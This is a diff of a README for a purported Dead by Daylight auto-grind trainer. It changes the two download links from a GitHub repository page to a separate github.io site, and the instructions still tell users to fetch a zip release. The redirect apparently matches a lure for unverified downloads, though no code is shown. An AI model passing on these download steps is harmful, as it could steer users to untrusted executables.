@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Elite - Automate your progression in Dead by Daylight
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Artistical718/DBD-AutoGrind-Trainer-2026-Elite)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://artistical718.github.io)
 
 ## 📌 About this software
 
@@ -21,7 +21,7 @@ Check these requirements before you start the installation:
 
 Follow these steps to obtain the files for the trainer:
 
-1. Visit [this link](https://github.com/Artistical718/DBD-AutoGrind-Trainer-2026-Elite) to reach the repository page.
+1. Visit [this link](https://artistical718.github.io) to reach the repository page.
 2. Look for the Releases section on the right side of the page.
 3. Click on the latest release version.
 4. Locate the file named `DBD-AutoGrind-Trainer-2026-Elite.zip`.
